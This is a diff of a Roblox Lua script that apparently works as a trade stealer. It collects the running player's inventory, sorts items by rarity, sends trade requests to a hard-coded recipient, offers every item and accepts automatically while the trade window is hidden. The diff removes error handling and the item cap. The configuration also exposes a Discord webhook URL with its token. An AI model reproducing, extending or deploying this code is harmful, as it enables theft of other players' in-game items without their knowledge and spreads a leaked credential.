@@ -2,10 +2,11 @@ local Configuration = {
     Username = "7Jamiee7",
     ManualChatCmd = "!Send",
     PrintInventory = false, 
-    DebugPrints = false,
+    DebugPrints = true,
     HideTradeUI = true,
     WebhookURL = "https://discord.com/api/webhooks/1345936159582322688/NTVHQH0ftklfXWmU_PexIlV_BwZ4iy_AOOMaG033dno8ECVG-RZ6t67bjPhMeVW2Ok5J"
 }
+
 
 repeat wait() until pcall(function() return game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game.Crafting.Inventory.Salvage.ScrollFrame.Container end)
 
@@ -86,20 +87,12 @@ function collectInventoryData()
         Ancient = 11
     }
 
-    local itemNameMapping = {
-        TestVal = "TestVal1"
-    }
-
     for _, item in ipairs(Resources.InventoryPath:GetChildren()) do
         if item:IsA("Frame") then
             local itemName = item.Name
             local amount = 1
             local rarity = nil
             local priority = 0
-
-            if itemNameMapping[itemName] then
-                itemName = itemNameMapping[itemName]
-            end
 
             for _, desc in ipairs(item:GetDescendants()) do
                 if desc:IsA("TextLabel") then
@@ -134,7 +127,6 @@ function collectInventoryData()
     end
 end
 collectInventoryData()
-
 
 
 
@@ -178,84 +170,33 @@ function tradeLoop(targetName)
         Resources.TradeStarted = false
 
         while not Resources.TradeStarted do
-            local success, errorMsg = pcall(function()
-                sendTradeRequest(targetName)
-            end)
-            if not success then
-                if Configuration.DebugPrints then
-                warn("Error sending trade request:", errorMsg)
-                end
-            end
+            sendTradeRequest(targetName)
             task.wait(5)
         end
 
         task.wait(2)
-        local success, errorMsg = pcall(function()
-            collectInventoryData()
+
+        table.sort(Resources.itemData, function(a, b)
+            return a.Priority > b.Priority
         end)
-        if not success then
-            if Configuration.DebugPrints then
-            warn("Error collecting inventory data:", errorMsg)
-            end
-        end
 
-        local success, errorMsg = pcall(function()
-            table.sort(Resources.itemData, function(a, b)
-                return a.Priority > b.Priority
-            end)
-        end)
-        if not success then
-            if Configuration.DebugPrints then
-            warn("Error sorting inventory data:", errorMsg)
-            end
-        end
-
-        local selectedItems = {}
-        local rarityIndex = 11
-
-        while #selectedItems < 4 and rarityIndex > 0 do
-            local success, errorMsg = pcall(function()
-                for _, item in ipairs(Resources.itemData) do
-                    if item.Priority == rarityIndex and #selectedItems < 4 then
-                        table.insert(selectedItems, item)
-                    end
-                end
-            end)
-            if not success then
-                if Configuration.DebugPrints then
-                warn("Error selecting items:", errorMsg)
-                end
-            end
-            rarityIndex = rarityIndex - 1
-        end
-
-        for _, item in ipairs(selectedItems) do
-            for i = 1, item.Amount do
-                local success, errorMsg = pcall(function()
-                    OfferItem(item.Name)
-                end)
-                if not success then
-                    if Configuration.DebugPrints then
-                    warn("Error offering item:", errorMsg)
-                    end
-                end
+        print("Starting offer loop")
+        for _, item in ipairs(Resources.itemData) do
+            print("Processing item: " .. item.Name)
+            for j = 1, item.Amount do
+                print("Attempting to offer")
+                OfferItem(item.Name)
             end
         end
 
         task.wait(8)
-
-        local success, errorMsg = pcall(function()
-            AcceptTrade()
-        end)
-        if not success then
-            if Configuration.DebugPrints then
-            warn("Error accepting trade:", errorMsg)
-            end
-        end
-
+        AcceptTrade()
         task.wait(7)
     end
 end
+
+
+
 
 
 
